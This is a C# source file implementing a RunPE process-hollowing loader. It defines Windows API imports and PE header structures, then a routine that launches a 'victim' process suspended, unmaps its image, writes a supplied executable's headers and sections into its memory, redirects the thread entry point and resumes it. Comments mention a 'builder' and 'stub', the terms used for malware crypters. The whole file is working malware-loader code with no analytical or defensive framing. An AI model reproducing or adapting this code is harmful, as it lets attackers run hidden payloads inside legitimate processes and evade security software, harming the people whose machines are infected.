using System.Runtime.InteropServices;
using System.Text;
using System;

using Microsoft.VisualBasic;

namespace rpe
{
    class AB
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public int lpReserved2;
            public int hStdInput;
            public int hStdOutput;
            public int hStdError;
        }

        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll")]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll")]
        private static extern int LoadLibraryA(string lpLibFileName);

        [DllImport("kernel32.dll")]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo,
            ref PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "WriteProcessMemory", CallingConvention = CallingConvention.StdCall)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int64 iSize, ref Int64 lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "WriteProcessMemory", CallingConvention = CallingConvention.StdCall)]
        public static extern bool WriteProcessMemoryI(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, Int64 iSize, ref Int64 lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory")]
        public static extern Int64 ReadProcessMemory(IntPtr hProcess, int lpBaseAddress, ref IntPtr lpbuffer, int size, ref int lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern long ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, UIntPtr flNewProtect, [Out()]uint lpflOldProtect);

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public System.UInt16 e_magic;
            // Magic number
            public System.UInt16 e_cblp;
            // Bytes on last page of file
            public System.UInt16 e_cp;
            // Pages in file
            public System.UInt16 e_crlc;
            // Relocations
            public System.UInt16 e_cparhdr;
            // Size of header in paragraphs
            public System.UInt16 e_minalloc;
            // Minimum extra paragraphs needed
            public System.UInt16 e_maxalloc;
            // Maximum extra paragraphs needed
            public System.UInt16 e_ss;
            // Initial (relative) SS value
            public System.UInt16 e_sp;
            // Initial SP value
            public System.UInt16 e_csum;
            // Checksum
            public System.UInt16 e_ip;
            // Initial IP value
            public System.UInt16 e_cs;
            // Initial (relative) CS value
            public System.UInt16 e_lfarlc;
            // File address of relocation table
            public System.UInt16 e_ovno;
            // Overlay number
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public System.UInt16[] e_res1;
            // Reserved words
            public System.UInt16 e_oemid;
            // OEM identifier (for e_oeminfo)
            public System.UInt16 e_oeminfo;
            // OEM information; e_oemid specific
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public System.UInt16[] e_res2;
            // Reserved words
            public int e_lfanew;
            // File address of new EXE header
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            //
            // Standard fields.
            //
            public System.UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public uint BaseOfData;
            //
            // NT additional fields.
            //
            public uint ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public System.UInt16 MajorOperatingSystemVersion;
            public System.UInt16 MinorOperatingSystemVersion;
            public System.UInt16 MajorImageVersion;
            public System.UInt16 MinorImageVersion;
            public System.UInt16 MajorSubsystemVersion;
            public System.UInt16 MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public System.UInt16 Subsystem;
            public System.UInt16 DllCharacteristics;
            public uint SizeOfStackReserve;
            public uint SizeOfStackCommit;
            public uint SizeOfHeapReserve;
            public uint SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_FILE_HEADER
        {
            public System.UInt16 Machine;
            public System.UInt16 NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public System.UInt16 SizeOfOptionalHeader;
            public System.UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        public struct IMAGE_NT_HEADERS
        {
            public uint Signature;
            public IMAGE_FILE_HEADER FileHeader;
            public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
        }

        public struct IMAGE_SECTION_HEADER
        {
            public System.Byte Name;
            public Misc Misc;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public System.UInt16 NumberOfRelocations;
            public System.UInt16 NumberOfLinenumbers;
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct VS_VERSIONINFO
        {
            public System.UInt16 wLength;
            public System.UInt16 wValueLength;
            public System.UInt16 wType;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 15)]
            public string szKey;
            public System.UInt16 Padding1;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct VS_FIXEDFILEINFO
        {
            public uint dwSignature;
            public uint dwStrucVersion;
            public uint dwFileVersionMS;
            public uint dwFileVersionLS;
            public uint dwProductVersionMS;
            public uint dwProductVersionLS;
            public uint dwFileFlagsMask;
            public uint dwFileFlags;
            public uint dwFileOS;
            public uint dwFileType;
            public uint dwFileSubtype;
            public uint dwFileDateMS;
            public uint dwFileDateLS;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags;
            //set this to an appropriate value
            // Retrieved by CONTEXT_DEBUG_REGISTERS
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        public enum IMAGE_SIZEOF_SHORT_NAME
        {
            IMAGE_SIZEOF_SHORT_NAME = 8
        }

        public struct Misc
        {
            public uint PhysicalAddress;
            public uint VirtualSize;
        }

        public const uint CONTEXT_X86 = 0x10000;
        public const uint CONTEXT86_CONTROL = (CONTEXT_X86 | 0x1);

        //SS:SP, CS:IP, FLAGS, BP
        public const uint CONTEXT86_INTEGER = (CONTEXT_X86 | 0x2);

        //AX, BX, CX, DX, SI, DI
        public const uint CONTEXT86_SEGMENTS = (CONTEXT_X86 | 0x4);

        //DS, ES, FS, GS
        public const uint CONTEXT86_FLOATING_POINT = (CONTEXT_X86 | 0x8);

        //387 state
        public const uint CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 | 0x10);

        //DB 0-3,6,7
        public const uint CONTEXT86_FULL = (CONTEXT86_CONTROL | CONTEXT86_INTEGER | CONTEXT86_SEGMENTS);
        public const uint CREATE_SUSPENDED = 0x4;

        public const long MEM_COMMIT = 0x1000L;
        public const long MEM_RESERVE = 0x2000L;
        public const uint PAGE_NOCACHE = 0x200;
        public const uint PAGE_EXECUTE_READWRITE = 0x40;
        public const uint PAGE_EXECUTE_WRITECOPY = 0x80;
        public const uint PAGE_EXECUTE_READ = 0x20;
        public const uint PAGE_EXECUTE = 0x10;
        public const uint PAGE_WRITECOPY = 0x8;
        public const uint PAGE_NOACCESS = 0x1;
        public const uint PAGE_READWRITE = 0x4;

        const uint GENERIC_READ = 0x80000000;
        const uint FILE_SHARE_READ = 0x1;
        const uint OPEN_EXISTING = 3;
        const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        const Int64 INVALID_HANDLE_VALUE = -1;
        const uint PAGE_READONLY = 0x2;
        const uint FILE_MAP_READ = 0x4;
        const uint IMAGE_DOS_SIGNATURE = 0x5a4d;
        const Int64 RT_VERSION = 16;

        private enum ImageSignatureTypes : uint
        {
            IMAGE_DOS_SIGNATURE = 0x5a4d,
            //'\\ MZ
            IMAGE_OS2_SIGNATURE = 0x454e,
            //'\\ NE
            IMAGE_OS2_SIGNATURE_LE = 0x454c,
            //'\\ LE
            IMAGE_VXD_SIGNATURE = 0x454c,
            //'\\ LE
            IMAGE_NT_SIGNATURE = 0x4550
            //'\\ PE00
        }

        public static void SRC(byte[] b, string sVictim)
        {
            IMAGE_DOS_HEADER pidh = default(IMAGE_DOS_HEADER);
            CONTEXT context = new CONTEXT();

            IMAGE_NT_HEADERS Pinh = default(IMAGE_NT_HEADERS);
            IMAGE_SECTION_HEADER Pish = default(IMAGE_SECTION_HEADER);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();

            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();

            //converts a data type in another type.
            //since .net types are different from types handle by winAPI,  DirectCall a API will cause a type mismatch, since .net types
            // structure is completely different, using different resources.
            GCHandle MyGC = GCHandle.Alloc(b, GCHandleType.Pinned);
            long ptbuffer = MyGC.AddrOfPinnedObject().ToInt64();

            pidh = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(MyGC.AddrOfPinnedObject(), pidh.GetType());
            MyGC.Free();

            if (!CreateProcess(null, sVictim, ref pSec, ref tSec, false, 0x4, new System.IntPtr(), null, ref si, ref pi))
            {
                return;
            }

            long vt = ptbuffer + pidh.e_lfanew;
            Pinh = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(new IntPtr(vt), Pinh.GetType());

            IntPtr addr = new IntPtr();
            long lOffset = 0;
            long ret = 0;

            //si.cb = Strings.Len(si);

            context.ContextFlags = CONTEXT86_INTEGER;

            //all "IF" are only for better understanding, you could do all verification on the builder and then the rest on the stub
            if (Pinh.Signature != (uint)ImageSignatureTypes.IMAGE_NT_SIGNATURE || pidh.e_magic != (uint)ImageSignatureTypes.IMAGE_DOS_SIGNATURE)
                return;

            int lpNumberOfBytesRead = 0;
            if (GetThreadContext(pi.hThread, ref context) &
                ReadProcessMemory(pi.hProcess, (int)context.Ebx + 8, ref addr, 4, ref lpNumberOfBytesRead) >= 0 &
                ZwUnmapViewOfSection(pi.hProcess, addr) >= 0)
            {

                Int64 ImageBase = VirtualAllocEx(pi.hProcess, new IntPtr(Pinh.OptionalHeader.ImageBase), Pinh.OptionalHeader.SizeOfImage, (uint)(MEM_RESERVE | MEM_COMMIT), (uint)PAGE_READWRITE).ToInt64();
                if (ImageBase != 0)
                {
                    WriteProcessMemory(pi.hProcess, new IntPtr(ImageBase), b, (long)Pinh.OptionalHeader.SizeOfHeaders, ref ret);

                    lOffset = pidh.e_lfanew + 248;
                    for (int i = 0; i <= Pinh.FileHeader.NumberOfSections - 1; i++)
                    {
                        //math changes, anyone with pe understanding know
                        Pish = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(new IntPtr(ptbuffer + lOffset + i * 40), Pish.GetType());

                        byte[] braw = new byte[Pish.SizeOfRawData + 1];
                        //more math for reading only the section.  mm API has a "shortcut" when you pass a specified startpoint.
                        //.net can't use so you have to make a new array
                        for (int j = 0; j <= Pish.SizeOfRawData - 1; j++)
                        {
                            braw[j] = b[Pish.PointerToRawData + j];
                        }

                        WriteProcessMemory(pi.hProcess, new IntPtr(ImageBase + Pish.VirtualAddress), braw, (int)Pish.SizeOfRawData, ref ret);

                        VirtualProtectEx(pi.hProcess, new IntPtr(ImageBase + Pish.VirtualAddress),
                            new UIntPtr(Pish.Misc.VirtualSize), new UIntPtr((uint)Protect(Pish.Characteristics)), (uint)addr.ToInt64());
                    }

                    byte[] bb = BitConverter.GetBytes(ImageBase);

                    WriteProcessMemory(pi.hProcess, new IntPtr(context.Ebx + 8), bb, 4, ref ret);

                    context.Eax = (uint)ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint;

                    SetThreadContext(pi.hThread, ref context);
                    ResumeThread(pi.hThread);
                }
            }
        }

        private static long Protect(long characteristics)
        {
            object[] mapping = { PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READWRITE };

            long index = RShift(characteristics, 29);

            string mappingS = mapping[index].ToString();
            long resultLong = 0;
            if (long.TryParse(mappingS, out resultLong))
                return resultLong;

            return 0;
        }

        private static long RShift(long lValue, long lNumberOfBitsToShift)
        {
            double result = vbLongToULong(lValue) / (Math.Pow(2, lNumberOfBitsToShift));
            return (long)result;
        }
        private static double vbLongToULong(long Value)
        {
            double functionReturnValue = 0;
            const double OFFSET_4 = 4294967296.0;
            if (Value < 0)
            {
                functionReturnValue = Value + OFFSET_4;
            }
            else
            {
                functionReturnValue = Value;
            }
            return functionReturnValue;
        }
    }
}